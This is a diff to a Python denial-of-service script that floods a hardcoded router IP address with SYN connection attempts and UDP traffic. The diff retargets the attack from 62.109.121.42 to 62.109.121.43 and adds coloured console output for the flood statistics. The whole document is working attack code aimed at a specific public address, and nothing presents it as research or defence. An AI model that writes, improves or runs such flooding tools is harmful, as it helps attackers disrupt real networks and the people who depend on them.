@@ -3,7 +3,13 @@ import threading
 import time
 import random
 
-router_ip = "62.109.121.42"
+router_ip = "62.109.121.43"
+
+# Colors
+MAGENTA = '\033[95m'
+GREEN = '\033[92m'
+RED = '\033[91m'
+RESET = '\033[0m'
 
 # Stats tracking
 stats = {
@@ -50,7 +56,7 @@ def syn_attack():
             result = sock.connect_ex((router_ip, port))
             with stats_lock:
                 stats["syn_sent"] += 1
-                stats["syn_data"] += 64  # Estimated SYN packet size
+                stats["syn_data"] += 64
                 if result == 0:
                     stats["syn_success"] += 1
                 else:
@@ -82,10 +88,10 @@ while True:
             total_success = stats["udp_success"] + stats["syn_success"]
             total_fail = stats["udp_fail"] + stats["syn_fail"]
             
-            # Convert bytes to MB
             data_mb = total_data / (1024 * 1024)
+            pps = total_sent // 10
             
-            print(f"2M50:{total_sent}:{data_mb:.2f}MB ---> ({total_success},{total_fail})")
+            print(f"{MAGENTA}2M50{RESET}:{GREEN}{total_sent}{RESET}:{GREEN}{data_mb:.2f}MB{RESET} ---> ({GREEN}{total_success}{RESET},{RED}{total_fail}{RESET})")
             
             # Reset counters
             stats["udp_sent"] = 0
